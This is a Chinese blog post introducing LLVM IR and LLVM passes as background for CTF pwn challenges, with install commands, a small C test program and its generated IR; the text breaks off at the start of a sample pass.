<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>llvm-pass初识 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="哈人">
<meta property="og:type" content="article">
<meta property="og:title" content="llvm-pass初识">
<meta property="og:url" content="https://ixout.github.io/posts/10060/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="哈人">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg">
<meta property="article:published_time" content="2024-04-12T04:36:45.000Z">
<meta property="article:modified_time" content="2024-04-18T09:11:31.845Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="llvm-pass">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/10060/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'llvm-pass初识',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-18 17:11:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">llvm-pass初识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-12T04:36:45.000Z" title="发表于 2024-04-12 12:36:45">2024-04-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-18T09:11:31.845Z" title="更新于 2024-04-18 17:11:31">2024-04-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h1><p>要学习LLVM PASS类pwn，首先要知道什么是LLVM</p>
<p><code>LLVM</code>是<code>C++</code>编写的构架编译器的框架系统，可用于优化以任意程序语言编写的程序。</p>
<p><code>LLVM Pass</code>可用于对代码进行优化或者对代码插桩（插入新代码），<code>LLVM</code>的核心库中提供了一些<code>Pass</code>类可以继承，通过实现它的一些方法，可以对传入的<code>LLVM IR</code>进行遍历并操作。</p>
<p><code>LLVM IR</code>即代码的中间表示，有三种形式：</p>
<ol>
<li><code>.ll</code> 格式：人类可以阅读的文本,介于高级语言和汇编代码之间</li>
<li><code>.bc</code> 格式：bitcode适合机器存储的二进制文件</li>
<li>内存表示,只保存在内存中</li>
</ol>
<p>然后要知道LLVM PASS是什么：pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-12_124718.png" alt=""></p>
<p>首先我们的源代码会被clang编译器编译成一种中间代码——IR，这个叫IR的东西非常重要，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。</p>
<p>大概就是说，LLVM提供了<strong>一种中间语言形式</strong>，以及编译链接这种语言的后端能力，那么<u>对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力</u>。</p>
<p>而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装<code>CTF</code>题目中常用的三个版本的<code>clang</code>及<code>LLVM</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>一个测试用的c语言小程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, name, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进行编译然后执行如下命令，将c文件编译成ll后缀的文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure>
<p>查看内容</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; ModuleID = &#x27;test.c&#x27;</span></span><br><span class="line">source_filename <span class="operator">=</span> <span class="string">&quot;test.c&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">datalayout</span> <span class="operator">=</span> <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">triple</span> <span class="operator">=</span> <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title">@.str</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;Please tell me your name:<span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"><span class="title">@.str.1</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;Hello: <span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local <span class="type">i32</span> <span class="title">@main</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%1</span> <span class="operator">=</span> <span class="keyword">alloca</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">16</span></span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> <span class="title">@puts</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span>))</span><br><span class="line">  <span class="variable">%3</span> <span class="operator">=</span> <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span></span><br><span class="line">  <span class="variable">%4</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i64</span> <span class="title">@read</span>(<span class="type">i32</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i8</span>* <span class="variable">%3</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">16</span>)</span><br><span class="line">  <span class="variable">%5</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> (<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="title">@printf</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str.1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span>))</span><br><span class="line">  <span class="variable">%6</span> <span class="operator">=</span> <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span></span><br><span class="line">  <span class="variable">%7</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i64</span> <span class="title">@write</span>(<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> <span class="type">i8</span>* <span class="variable">%6</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">16</span>)</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i32</span> <span class="title">@puts</span>(<span class="type">i8</span>*) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i64</span> <span class="title">@read</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i8</span>*<span class="punctuation">,</span> <span class="type">i64</span>) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i32</span> <span class="title">@printf</span>(<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i64</span> <span class="title">@write</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i8</span>*<span class="punctuation">,</span> <span class="type">i64</span>) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#0</span> <span class="operator">=</span> &#123; <span class="keyword">noinline</span> <span class="keyword">nounwind</span> <span class="keyword">optnone</span> <span class="keyword">uwtable</span> <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span><span class="operator">=</span><span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span><span class="operator">=</span><span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#1</span> <span class="operator">=</span> &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span><span class="operator">=</span><span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!llvm.module.flags</span> <span class="operator">=</span> !&#123;<span class="title">!0</span>&#125;</span><br><span class="line"><span class="title">!llvm.ident</span> <span class="operator">=</span> !&#123;<span class="title">!1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!0</span> <span class="operator">=</span> !&#123;<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> !<span class="string">&quot;wchar_size&quot;</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">4</span>&#125;</span><br><span class="line"><span class="title">!1</span> <span class="operator">=</span> !&#123;!<span class="string">&quot;clang version 10.0.0-4ubuntu1 &quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们用官方给的小demo写一个LLVM PASS出来：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.cpp</span></span><br><span class="line"><span 